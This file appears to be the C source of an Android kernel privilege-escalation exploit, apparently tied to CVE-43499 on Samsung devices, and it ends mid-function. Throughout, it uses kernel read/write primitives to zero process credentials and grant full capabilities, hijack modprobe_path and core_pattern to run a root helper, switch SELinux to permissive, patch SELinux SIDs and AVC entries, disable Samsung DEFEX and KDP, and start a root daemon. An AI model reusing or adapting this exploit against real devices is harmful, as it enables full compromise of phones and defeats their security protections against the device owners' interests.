#include "common.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
static uint32_t root_umh_callback_pid;
static uint32_t root_umh_runtime_sid;
static int root_avc_attempts;
static int root_avc_status;

/* Preserve the cache alignment of the CFI-robust M53 checkpoint. */
__attribute__((used, section(".rodata")))
static const unsigned char root_m53_layout_pad[0x88];

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_SOCKET_NAME "cve43499_su"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"
#define ROOT_MODPROBE_HELPER "/data/local/tmp/rootmodprobe"
#define ROOT_MODPROBE_TRIGGER "/data/local/tmp/rootbinfmt"

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
#if defined(LEGACY_UMH_SUBPROCESS_INFO) && LEGACY_UMH_SUBPROCESS_INFO
  uint64_t file;
#endif
  int32_t wait;
  int32_t retval;
#if defined(LEGACY_UMH_SUBPROCESS_INFO) && LEGACY_UMH_SUBPROCESS_INFO
  int32_t pid;
  int32_t pid_pad;
#endif
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  char cmd[256];
  uint64_t argv[5];
  uint64_t envp[1];
};

#if defined(LEGACY_UMH_SUBPROCESS_INFO) && LEGACY_UMH_SUBPROCESS_INFO
_Static_assert(sizeof(struct umh_subprocess_info) == 128,
               "legacy subprocess_info layout");
#else
_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
#endif
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
#if defined(ROOT_UMH_CALLBACK_WRAPPER)
_Static_assert(offsetof(struct umh_subprocess_info, init) == 0x68,
               "callback init offset");
_Static_assert(offsetof(struct umh_subprocess_info, cleanup) == 0x70,
               "callback cleanup offset");
#endif

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  if (getenv("ROOT_READ_USE_PIPE_PHYSRW")) {
    return pipe_phys_read_data(fd, target, data, len);
  }
#if defined(ROOT_USE_CONFIGFS_RW) && ROOT_USE_CONFIGFS_RW
  return kernel_read_data(fd, target, data, len) == (ssize_t)len;
#else
  return pipe_phys_read_data(fd, target, data, len);
#endif
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
#if defined(ROOT_USE_CONFIGFS_RW) && ROOT_USE_CONFIGFS_RW
  return kernel_write_data(fd, target, data, len) == (ssize_t)len;
#else
  return pipe_phys_write_data(fd, target, data, len);
#endif
}

static void disable_defex(int fd);
static int try_disable_kdp(int fd);

static int root_write_only_mode(void) {
  const char *value = getenv("PSELECT_M53_WRITE_ONLY_CFI");
  if (value && *value) {
    return strcmp(value, "0") != 0;
  }
#if defined(PSELECT_M53_WRITE_ONLY_CFI) && PSELECT_M53_WRITE_ONLY_CFI
  return 1;
#else
  return 0;
#endif
}

/* Keep the proven uid/gid-only path as the default.  A target may opt into
 * the usable-root continuation at build time, and the runtime setting always
 * wins so the same artifact can retain the old proof-only control. */
static int root_direct_usable_mode(void) {
  const char *value = getenv("ROOT_DIRECT_USABLE_ROOT");
  if (value && *value) {
    return strcmp(value, "0") != 0;
  }
#if defined(ROOT_DIRECT_USABLE_ROOT) && ROOT_DIRECT_USABLE_ROOT
  return 1;
#else
  return 0;
#endif
}

static uintptr_t root_env_direct_ptr(const char *name) {
  const char *raw = getenv(name);
  if (!raw || !*raw) {
    return 0;
  }

  char *end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(raw, &end, 0);
  if (errno || end == raw || *end) {
    pr_warning("root ignoring invalid %s=%s\n", name, raw);
    return 0;
  }

  uintptr_t value = (uintptr_t)parsed;
  if (!is_direct_ptr(value)) {
    pr_warning("root ignoring non-direct %s=%016zx\n", name, value);
    return 0;
  }
  return value;
}

static uint64_t root_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  root_read_data(fd, target, &value, sizeof(value));
  return value;
}

static uint32_t root_read32(int fd, uintptr_t target) {
  return (uint32_t)root_read64(fd, target);
}

static int root_read32_checked(
    int fd, uintptr_t target, uint32_t *value) {
  return root_read_data(fd, target, value, sizeof(*value));
}

static int root_read64_checked(
    int fd, uintptr_t target, uint64_t *value) {
  return root_read_data(fd, target, value, sizeof(*value));
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
#if defined(ROOT_UMH_ABSTRACT_SOCKET) && ROOT_UMH_ABSTRACT_SOCKET
  memcpy(sun.sun_path + 1, ROOT_SOCKET_NAME, sizeof(ROOT_SOCKET_NAME) - 1);
  socklen_t sun_len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) +
                                  sizeof(ROOT_SOCKET_NAME));
#else
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  socklen_t sun_len = sizeof(sun);
#endif
  int ready = connect(fd, (struct sockaddr *)&sun, sun_len) == 0;
  close(fd);
  return ready;
}

static int __attribute__((unused)) root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}

static int __attribute__((unused)) root_proof_ready(void) {
  char buf[256];
  int fd = open("/data/local/tmp/rootproof", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  return strstr(buf, "uid=0(root)") != NULL;
}

static int write_direct_id_proof(void) {
  char proof[256];
  int n = snprintf(proof, sizeof(proof),
                   "uid=%u(root) euid=%u(root) gid=%u(root) egid=%u(root)\n",
                   getuid(), geteuid(), getgid(), getegid());
  if (n <= 0 || n >= (int)sizeof(proof)) {
    return 0;
  }

  int fd = open("/data/local/tmp/rootproof",
                O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
  if (fd < 0) {
    pr_warning("root direct proof open failed errno=%d\n", errno);
    return 0;
  }
  ssize_t written = write(fd, proof, (size_t)n);
  int close_ret = close(fd);
  chmod("/data/local/tmp/rootproof", 0666);
  pr_info("root direct proof write=%zd close=%d data=%s",
          written, close_ret, proof);
  return written == n && close_ret == 0;
}

static int root_write_user_file(
    const char *path, const void *data, size_t len, mode_t mode) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (fd < 0) {
    pr_warning("root user file open failed path=%s errno=%d\n",
               path, errno);
    return 0;
  }
  ssize_t written = write(fd, data, len);
  int close_ret = close(fd);
  chmod(path, mode);
  return written == (ssize_t)len && close_ret == 0;
}

static int root_prepare_modprobe_files(void) {
  const char helper[] =
      "#!/system/bin/sh\n"
      "/system/bin/id > /data/local/tmp/rootproof\n"
      "/system/bin/chmod 666 /data/local/tmp/rootproof\n";
  const unsigned char trigger[] = {0xff, 0xff, 0xff, 0xff, '\n'};
  unlink("/data/local/tmp/rootproof");
  return root_write_user_file(
             ROOT_MODPROBE_HELPER, helper, sizeof(helper) - 1, 0777) &&
         root_write_user_file(
             ROOT_MODPROBE_TRIGGER, trigger, sizeof(trigger), 0777);
}

static int root_trigger_modprobe(void) {
  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("root modprobe trigger fork failed errno=%d\n", errno);
    return 0;
  }
  if (pid == 0) {
    char *const argv[] = {(char *)ROOT_MODPROBE_TRIGGER, NULL};
    char *const envp[] = {NULL};
    execve(ROOT_MODPROBE_TRIGGER, argv, envp);
    _exit(127);
  }

  int status = 0;
  waitpid(pid, &status, 0);
  pr_info("root modprobe trigger pid=%d status=%d\n", pid, status);
  return 1;
}

static int install_modprobe_path_root(int fd) {
#ifdef MODPROBE_PATH
  disable_defex(fd);
  int kdp_disabled = try_disable_kdp(fd);
  pr_info("root modprobe path kdp_disabled=%d\n", kdp_disabled);

  if (getenv("ROOT_MODPROBE_PREPARED")) {
    pr_info("root modprobe files assumed prepared by env\n");
  } else {
    pr_info("root modprobe preparing helper files\n");
    if (!root_prepare_modprobe_files()) {
      pr_error("root modprobe file preparation failed\n");
      return 0;
    }
    pr_info("root modprobe helper files prepared\n");
  }

  char path[256];
  memset(path, 0, sizeof(path));
  snprintf(path, sizeof(path), "%s", ROOT_MODPROBE_HELPER);
  uintptr_t modprobe_addr = data_addr(MODPROBE_PATH);
  pr_info("root modprobe writing path target=%016zx helper=%s\n",
          modprobe_addr, path);
  int path_ok = root_write_data(fd, modprobe_addr, path, sizeof(path));
  pr_info("root modprobe path write ok=%d errno=%d\n", path_ok, errno);

  uint8_t permissive = 0;
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  int selinux_ok = 1;
  if (!getenv("ROOT_MODPROBE_SKIP_SELINUX")) {
    pr_info("root modprobe writing selinux permissive target=%016zx\n",
            selinux_addr);
    selinux_ok =
        root_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
    pr_info("root modprobe selinux write ok=%d errno=%d\n",
            selinux_ok, errno);
  }
  pr_info("root modprobe writes path=%d target=%016zx helper=%s "
          "selinux=%d target=%016zx\n",
          path_ok, modprobe_addr, path, selinux_ok, selinux_addr);
  if (!path_ok || !selinux_ok) {
    return 0;
  }

  for (int i = 0; i < 4; i++) {
    root_trigger_modprobe();
    for (int j = 0; j < 100; j++) {
      if (root_proof_ready()) {
        root_child_done = 1;
        root_uid_after = 0;
        pr_info("root modprobe proof ready attempt=%d\n", i + 1);
        return 1;
      }
      usleep(10000);
    }
  }

  pr_warning("root modprobe proof not observed\n");
  return 0;
#else
  (void)fd;
  pr_warning("root modprobe path unavailable for this target\n");
  return 0;
#endif
}

static int root_trigger_core_pattern(void) {
  struct rlimit before;
  memset(&before, 0, sizeof(before));
  int get_before = getrlimit(RLIMIT_CORE, &before);
  struct rlimit lim = {
      .rlim_cur = RLIM_INFINITY,
      .rlim_max = RLIM_INFINITY,
  };
  int set_ret = setrlimit(RLIMIT_CORE, &lim);
  int set_errno = errno;
  struct rlimit after;
  memset(&after, 0, sizeof(after));
  int get_after = getrlimit(RLIMIT_CORE, &after);
  pr_info("root core rlimit before=%d/%llu/%llu set=%d errno=%d "
          "after=%d/%llu/%llu\n",
          get_before, (unsigned long long)before.rlim_cur,
          (unsigned long long)before.rlim_max, set_ret, set_errno,
          get_after, (unsigned long long)after.rlim_cur,
          (unsigned long long)after.rlim_max);

  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("root core trigger fork failed errno=%d\n", errno);
    return 0;
  }
  if (pid == 0) {
    int dump_ret = prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
    pr_info("root core child dumpable ret=%d errno=%d\n",
            dump_ret, errno);
    volatile int *crash = (volatile int *)0;
    *crash = 1;
    _exit(127);
  }

  int status = 0;
  waitpid(pid, &status, 0);
  pr_info("root core trigger pid=%d status=%d signaled=%d sig=%d core=%d "
          "exited=%d exit=%d\n",
          pid, status, WIFSIGNALED(status), WIFSIGNALED(status) ?
          WTERMSIG(status) : 0, WCOREDUMP(status), WIFEXITED(status),
          WIFEXITED(status) ? WEXITSTATUS(status) : 0);
  return 1;
}

static int install_core_pattern_root(int fd) {
#ifdef CORE_PATTERN
  disable_defex(fd);
  int kdp_disabled = try_disable_kdp(fd);
  pr_info("root core pattern kdp_disabled=%d\n", kdp_disabled);

  if (getenv("ROOT_MODPROBE_PREPARED")) {
    pr_info("root core helper assumed prepared by env\n");
  } else if (!root_prepare_modprobe_files()) {
    pr_error("root core helper preparation failed\n");
    return 0;
  }

  char pattern[128];
  memset(pattern, 0, sizeof(pattern));
  snprintf(pattern, sizeof(pattern), "|/system/bin/sh %s",
           ROOT_MODPROBE_HELPER);
  uintptr_t core_addr = data_addr(CORE_PATTERN);
  pr_info("root core writing pattern target=%016zx pattern=%s\n",
          core_addr, pattern);
  int pattern_ok =
      root_write_data(fd, core_addr, pattern, sizeof(pattern));
  pr_info("root core pattern write ok=%d errno=%d\n", pattern_ok, errno);
  if (!pattern_ok) {
    return 0;
  }
  if (getenv("ROOT_CORE_PATTERN_READBACK")) {
    char readback[sizeof(pattern)];
    memset(readback, 0, sizeof(readback));
    int read_ok = root_read_data(fd, core_addr, readback, sizeof(readback));
    readback[sizeof(readback) - 1] = 0;
    pr_info("root core pattern readback ok=%d value=%s\n",
            read_ok, readback);
  }

  for (int i = 0; i < 4; i++) {
    root_trigger_core_pattern();
    for (int j = 0; j < 100; j++) {
      if (root_proof_ready()) {
        root_child_done = 1;
        root_uid_after = 0;
        pr_info("root core proof ready attempt=%d\n", i + 1);
        return 1;
      }
      usleep(10000);
    }
  }

  pr_warning("root core proof not observed\n");
  return 0;
#else
  (void)fd;
  pr_warning("root core pattern unavailable for this target\n");
  return 0;
#endif
}

static uintptr_t root_find_task_by_pid(int fd, int pid) {
  if (getenv("ROOT_SKIP_TASK_SCAN")) {
    pr_info("root task scan skipped by env pid=%d\n", pid);
    return 0;
  }

  uintptr_t init = getenv("ROOT_TASK_SCAN_TEXT_INIT") ?
      text_addr(INIT_TASK) : data_addr(INIT_TASK);
  uintptr_t head = init + TASK_STRUCT_TASKS_OFF;
  unsigned long long max_nodes = 65536;
  const char *max_env = getenv("ROOT_TASK_SCAN_MAX_RUNTIME");
  if (max_env && *max_env) {
    char *end = NULL;
    errno = 0;
    unsigned long long parsed = strtoull(max_env, &end, 0);
    if (!errno && end != max_env && !*end && parsed > 0) {
      max_nodes = parsed > 65536 ? 65536 : parsed;
    }
  }
  pr_info("root task scan start pid=%d init=%016zx head=%016zx max=%llu\n",
          pid, init, head, max_nodes);
  uintptr_t node = 0;
  if (!root_read64_checked(fd, head, &node)) {
    pr_warning("root task scan head read failed head=%016zx\n", head);
    return 0;
  }
  for (unsigned long long i = 0;
       i < max_nodes && is_direct_ptr(node) && node != head; i++) {
    uintptr_t task = node - TASK_STRUCT_TASKS_OFF;
    uint32_t task_pid = 0;
    if (!root_read32_checked(fd, task + TASK_STRUCT_PID_OFF, &task_pid)) {
      pr_warning("root task scan pid read failed i=%llu task=%016zx "
                 "node=%016zx\n",
                 i, task, node);
      return 0;
    }
#ifdef TASK_STRUCT_TGID_OFF
    uint32_t task_tgid = 0;
    if (!root_read32_checked(fd, task + TASK_STRUCT_TGID_OFF, &task_tgid)) {
      pr_warning("root task scan tgid read failed i=%llu task=%016zx "
                 "node=%016zx\n",
                 i, task, node);
      return 0;
    }
#else
    uint32_t task_tgid = task_pid;
#endif
    if (getenv("ROOT_TASK_SCAN_TRACE")) {
      pr_info("root task scan node i=%llu task=%016zx pid=%u tgid=%u "
              "next=%016zx\n",
              i, task, task_pid, task_tgid, node);
    }
    if ((int)task_pid == pid || (int)task_tgid == pid) {
      pr_info("root task scan found pid=%d task=%016zx i=%llu "
              "task_pid=%u task_tgid=%u\n",
              pid, task, i, task_pid, task_tgid);
      return task;
    }
    uintptr_t next = 0;
    if (!root_read64_checked(fd, node, &next)) {
      pr_warning("root task scan next read failed i=%llu node=%016zx\n",
                 i, node);
      return 0;
    }
    node = next;
  }
  pr_warning("root task scan not found pid=%d last_node=%016zx\n", pid, node);
  return 0;
}

/* Walk from the already observed live task instead of depending on the
 * stock address of init_task.  task_struct.tasks is a circular global list,
 * so this also finds pid 1 when KASLR/data-alias drift is still uncertain. */
static uintptr_t root_find_task_from_anchor(
    int fd, uintptr_t anchor_task, uint32_t wanted_pid) {
  if (!is_direct_ptr(anchor_task) || (anchor_task & 7)) {
    pr_warning("root anchored task scan invalid anchor=%016zx pid=%u\n",
               anchor_task, wanted_pid);
    return 0;
  }

  /* The successor of a short-lived userspace thread can be init_task, whose
   * list node lives in the randomized kernel image rather than the linear
   * map.  Accept that bounded image range while walking task list links. */
  uintptr_t image_end = kaslr_base ? kaslr_base + 0x4000000ULL : 0;
#define ROOT_TASK_LIST_PTR(v)                                                   \
  (is_direct_ptr((uintptr_t)(v)) ||                                            \
   (kaslr_base && (uintptr_t)(v) >= kaslr_base &&                              \
    (uintptr_t)(v) < image_end))

  uintptr_t head = anchor_task + TASK_STRUCT_TASKS_OFF;
  uintptr_t node = head;
  for (unsigned int i = 0; i < 65536; i++) {
    uintptr_t candidate = node - TASK_STRUCT_TASKS_OFF;
    uint32_t pid = 0;
    uint32_t tgid = 0;
    if (!ROOT_TASK_LIST_PTR(node) || (node & 7) ||
        !root_read32_checked(fd, candidate + TASK_STRUCT_PID_OFF, &pid) ||
        !root_read32_checked(fd, candidate + TASK_STRUCT_TGID_OFF, &tgid)) {
      pr_warning("root anchored task scan invalid node i=%u node=%016zx "
                 "task=%016zx\n", i, node, candidate);
      return 0;
    }
    /* For a process id, select its live thread-group leader.  Returning the
     * first worker whose tgid matches can hand later callers a task_struct
     * that exits immediately after the race. */
    if (pid == wanted_pid || (tgid == wanted_pid && pid == tgid)) {
      pr_info("root anchored task scan found want=%u task=%016zx i=%u "
              "pid=%u tgid=%u anchor=%016zx\n", wanted_pid, candidate, i,
              pid, tgid, anchor_task);
      return candidate;
    }

    uintptr_t next = 0;
    if (!root_read64_checked(fd, node, &next) || !ROOT_TASK_LIST_PTR(next) ||
        (next & 7)) {
      pr_warning("root anchored task scan next failed i=%u node=%016zx "
                 "next=%016zx\n", i, node, next);
      return 0;
    }
    node = next;
    if (node == head) {
      break;
    }
  }

  pr_warning("root anchored task scan not found pid=%u anchor=%016zx\n",
             wanted_pid, anchor_task);
#undef ROOT_TASK_LIST_PTR
  return 0;
}

static int root_read_task_cred_pair(
    int fd, uintptr_t task, uintptr_t *real_cred, uintptr_t *cred) {
  uint64_t real_value = 0;
  uint64_t effective_value = 0;
  int ok = is_direct_ptr(task) &&
      root_read64_checked(fd, task + TASK_STRUCT_REAL_CRED_OFF,
                          &real_value) &&
      root_read64_checked(fd, task + TASK_STRUCT_CRED_OFF,
                          &effective_value) &&
      is_direct_ptr((uintptr_t)real_value) &&
      is_direct_ptr((uintptr_t)effective_value);
  if (ok) {
    *real_cred = (uintptr_t)real_value;
    *cred = (uintptr_t)effective_value;
  }
  pr_info("root task creds task=%016zx real=%016llx effective=%016llx "
          "ok=%d\n", task, (unsigned long long)real_value,
          (unsigned long long)effective_value, ok);
  return ok;
}

static int root_read_sid_from_cred(
    int fd, uintptr_t cred, uint32_t *sid, uintptr_t *security_out) {
  uint64_t security_value = 0;
  uint32_t sid_value = 0;
  int ok = is_direct_ptr(cred) &&
      root_read64_checked(fd, cred + CRED_SECURITY_OFF, &security_value) &&
      is_direct_ptr((uintptr_t)security_value) &&
      root_read32_checked(fd, (uintptr_t)security_value +
                          CRED_SECURITY_SID_OFF, &sid_value) &&
      sid_value > 0 && sid_value < 0x10000;
  if (ok) {
    *sid = sid_value;
    if (security_out) {
      *security_out = (uintptr_t)security_value;
    }
  }
  return ok;
}

static int root_write_sid_to_cred(
    int fd, uintptr_t cred, uint32_t sid, const char *label) {
  uintptr_t security = 0;
  uint32_t before = 0;
  if (!root_read_sid_from_cred(fd, cred, &before, &security)) {
    pr_warning("root SID target read failed %s cred=%016zx\n", label, cred);
    return 0;
  }

  uint32_t after = 0;
  int write_ok = root_write32(
      fd, security + CRED_SECURITY_SID_OFF, sid);
  int read_ok = write_ok && root_read32_checked(
      fd, security + CRED_SECURITY_SID_OFF, &after);
  int ok = read_ok && after == sid;
  pr_info("root SID patch %s cred=%016zx security=%016zx sid=%u->%u "
          "write=%d read=%d ok=%d\n", label, cred, security, before,
          after, write_ok, read_ok, ok);
  return ok;
}

static int root_write_sid_to_task(
    int fd, uintptr_t task, uint32_t sid, const char *label) {
  uintptr_t real_cred = 0;
  uintptr_t cred = 0;
  if (!root_read_task_cred_pair(fd, task, &real_cred, &cred)) {
    return 0;
  }
  return root_write_sid_to_cred(fd, real_cred, sid, label) &&
      (cred == real_cred ||
       root_write_sid_to_cred(fd, cred, sid, label));
}

static int root_read_pid1_sid(
    int fd, uintptr_t anchor_task, uint32_t *sid, uintptr_t *pid1_task) {
  uintptr_t task = root_find_task_from_anchor(fd, anchor_task, 1);
  uintptr_t real_cred = 0;
  uintptr_t cred = 0;
  uintptr_t security = 0;
  uint32_t value = 0;
  int ok = task && root_read_task_cred_pair(
      fd, task, &real_cred, &cred) &&
      root_read_sid_from_cred(fd, cred, &value, &security);
  if (ok) {
    *sid = value;
    if (pid1_task) {
      *pid1_task = task;
    }
  }
  pr_info("root pid1 SID task=%016zx real_cred=%016zx cred=%016zx "
          "security=%016zx sid=%u ok=%d\n", task, real_cred, cred,
          security, value, ok);
  return ok;
}

static int root_read_task_sid(int fd, int pid, uint32_t *sid) {
  uintptr_t task = root_find_task_by_pid(fd, pid);
  uintptr_t cred = is_direct_ptr(task)
      ? root_read64(fd, task + TASK_STRUCT_CRED_OFF) : 0;
  uintptr_t security = is_direct_ptr(cred)
      ? root_read64(fd, cred + CRED_SECURITY_OFF) : 0;
  uint32_t value = 0xffffffffU;
  int ok = is_direct_ptr(security) && root_read32_checked(
      fd, security + CRED_SECURITY_SID_OFF, &value) &&
      value > 0 && value < 0x10000;
  if (ok) {
    *sid = value;
  }
  pr_info("root task sid pid=%d task=%016zx cred=%016zx security=%016zx "
          "sid=%u ok=%d\n", pid, task, cred, security, value, ok);
  return ok;
}

static inline int root_grant_setenforce_avc(int fd, uint32_t ssid) {
  uintptr_t avc = root_read64(fd, data_addr(SELINUX_STATE) + 0x10);
  if (!avc) {
    avc = data_addr(SELINUX_AVC);
  }
  root_avc_status |= 1;
  root_avc_attempts++;
  uint32_t expected_slot = (ssid ^ (2U << 2) ^ (1U << 4)) & 511U;
  int full_scan = root_avc_attempts == 150 || root_avc_attempts == 300 ||
      root_avc_attempts == 450 || root_avc_attempts == 499;
  uint32_t first_slot = full_scan ? 0 : expected_slot;
  uint32_t slot_count = full_scan ? 512 : 1;

  for (uint32_t s = 0; s < slot_count; s++) {
    uint32_t slot = first_slot + s;
    uintptr_t list = root_read64(fd, avc + 8 + (uintptr_t)slot * 8);
    if (is_direct_ptr(list)) {
      root_avc_status |= 2;
    }
    for (int i = 0; i < 64 && is_direct_ptr(list); i++) {
      uintptr_t node = list - 40;
      uint32_t node_ssid = root_read32(fd, node);
      uint16_t node_tclass = 0;
      if (!root_read_data(fd, node + 8, &node_tclass,
                          sizeof(node_tclass))) {
        break;
      }
      if (node_ssid == ssid) {
        root_avc_status |= 4;
      }
      if (node_tclass == 1) {
        root_avc_status |= 8;
      }
      if (node_ssid == ssid && node_tclass == 1) {
        uint32_t allowed = root_read32(fd, node + 12);
        uint32_t after = 0;
        root_avc_status |= 16;
        int ok = root_write32(fd, node + 12, allowed | 0x80U) &&
            root_read32_checked(fd, node + 12, &after) &&
            (after & 0x80U) != 0;
        if (ok) {
          root_avc_status |= 32;
        }
        return ok;
      }
      list = root_read64(fd, list);
    }
  }
  return 0;
}

static int root_zero_cred(int fd, uintptr_t cred, const char *label) {
  if (!is_direct_ptr(cred)) {
    pr_warning("root cred invalid %s=%016zx\n", label, cred);
    return 0;
  }

  int write_only = root_write_only_mode();
  uint32_t ids[8] = {0};
  uint64_t caps = 0x3fffffffffULL;
  uint32_t before_uid = 0xffffffffU;
  uint32_t before_euid = 0xffffffffU;
  uint64_t before_cap = 0;
  if (!write_only) {
    if (!root_read32_checked(fd, cred + CRED_UID_OFF, &before_uid) ||
        !root_read32_checked(fd, cred + CRED_EUID_OFF, &before_euid) ||
        !root_read64_checked(fd, cred + CRED_CAP_EFFECTIVE_OFF,
                             &before_cap)) {
      pr_warning("root cred pre-read failed %s=%016zx\n", label, cred);
      return 0;
    }
    if (before_uid != getuid() || before_euid != geteuid()) {
      pr_warning("root cred pre-read unexpected ids %s=%016zx "
                 "uid=%u/%u euid=%u/%u\n",
                 label, cred, before_uid, getuid(),
                 before_euid, geteuid());
      return 0;
    }
  }
  int ids_ok = root_write_data(fd, cred + CRED_UID_OFF, ids, sizeof(ids));
  int caps_ok =
      root_write64(fd, cred + CRED_CAP_INHERITABLE_OFF, caps) &&
      root_write64(fd, cred + CRED_CAP_PERMITTED_OFF, caps) &&
      root_write64(fd, cred + CRED_CAP_EFFECTIVE_OFF, caps) &&
      root_write64(fd, cred + CRED_CAP_BSET_OFF, caps) &&
      root_write64(fd, cred + CRED_CAP_AMBIENT_OFF, caps);
  uint32_t after_uid = write_only ? 0 :
      root_read32(fd, cred + CRED_UID_OFF);
  uint32_t after_euid = write_only ? 0 :
      root_read32(fd, cred + CRED_EUID_OFF);
  uint64_t after_cap = write_only ? caps :
      root_read64(fd, cred + CRED_CAP_EFFECTIVE_OFF);
  pr_info("root cred patch %s=%016zx uid=%u->%u euid=%u->%u "
          "cap=%016llx->%016llx writes=%d/%d write_only=%d\n",
          label, cred, before_uid, after_uid, before_euid, after_euid,
          (unsigned long long)before_cap, (unsigned long long)after_cap,
          ids_ok, caps_ok, write_only);
  return ids_ok && caps_ok &&
         (write_only || (after_uid == 0 && after_euid == 0));
}

static int spawn_root_daemon_from_current(pid_t *daemon_pid) {
  const char *helper_path = getenv("CVE43499_ROOT_HELPER");
  if (!helper_path || helper_path[0] != '/') {
    helper_path = ROOT_UMH_PATH;
  }
  unlink(ROOT_SOCKET_PATH);
  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("root daemon fork failed errno=%d\n", errno);
    return 0;
  }
  if (pid == 0) {
    syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
    setsid();
    int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
    if (null_fd >= 0) {
      for (int stdfd = STDIN_FILENO; stdfd <= STDERR_FILENO; stdfd++) {
        if (null_fd != stdfd) {
          dup2(null_fd, stdfd);
        }
      }
      if (null_fd > STDERR_FILENO) {
        close(null_fd);
      }
    }
    execl(helper_path, helper_path, "--daemon", NULL);
    _exit(127);
  }

  for (int i = 0; i < 200; i++) {
    if (root_socket_ready()) {
      if (daemon_pid) {
        *daemon_pid = pid;
      }
      pr_info("root daemon ready pid=%d\n", pid);
      return 1;
    }
    usleep(10000);
  }
  pr_warning("root daemon not ready pid=%d\n", pid);
  return 0;
}

static ssize_t root_dump_readonly_block(const char *source, int output_fd) {
  int input_fd = open(source, O_RDONLY | O_CLOEXEC);
  if (input_fd < 0) {
    pr_warning("root dump source open failed path=%s errno=%d\n",
               source, errno);
    return -1;
  }

  unsigned char buffer[65536];
  ssize_t total = 0;
  for (;;) {
    ssize_t got = read(input_fd, buffer, sizeof(buffer));
    if (got < 0 && errno == EINTR) {
      continue;
    }
    if (got < 0) {
      pr_warning("root dump read failed path=%s total=%zd errno=%d\n",
                 source, total, errno);
      total = -1;
      break;
    }
    if (got == 0) {
      break;
    }
    ssize_t done = 0;
    while (done < got) {
      ssize_t put = write(output_fd, buffer + done, (size_t)(got - done));
      if (put < 0 && errno == EINTR) {
        continue;
      }
      if (put <= 0) {
        pr_warning("root dump output write failed path=%s total=%zd errno=%d\n",
                   source, total, errno);
        total = -1;
        break;
      }
      done += put;
      total += put;
    }
    if (total < 0) {
      break;
    }
  }
  close(input_fd);
  if (total >= 0 && fsync(output_fd) != 0) {
    pr_warning("root dump fsync failed path=%s errno=%d\n", source, errno);
    return -1;
  }
  return total;
}

static void disable_defex(int fd) {
#if defined(ROOT_SKIP_DEFEX_WRITE) && ROOT_SKIP_DEFEX_WRITE
  (void)fd;
  pr_info("root defex writes skipped\n");
  return;
#else
  uint8_t defex_unlocked = 1;
  uint8_t defex_soft = 2;
  ssize_t defex_boot_write = kernel_write_data(
      fd, data_addr(DEFEX_BOOT_STATE_UNLOCKED), &defex_unlocked,
      sizeof(defex_unlocked));
  ssize_t defex_priv_write = kernel_write_data(
      fd, data_addr(DEFEX_GLOBAL_PRIVESC_STATUS), &defex_soft,
      sizeof(defex_soft));
  ssize_t defex_safe_write = kernel_write_data(
      fd, data_addr(DEFEX_GLOBAL_SAFEPLACE_STATUS), &defex_soft,
      sizeof(defex_soft));
  ssize_t defex_int_write = kernel_write_data(
      fd, data_addr(DEFEX_GLOBAL_INTEGRITY_STATUS), &defex_soft,
      sizeof(defex_soft));
  ssize_t defex_imm_write = kernel_write_data(
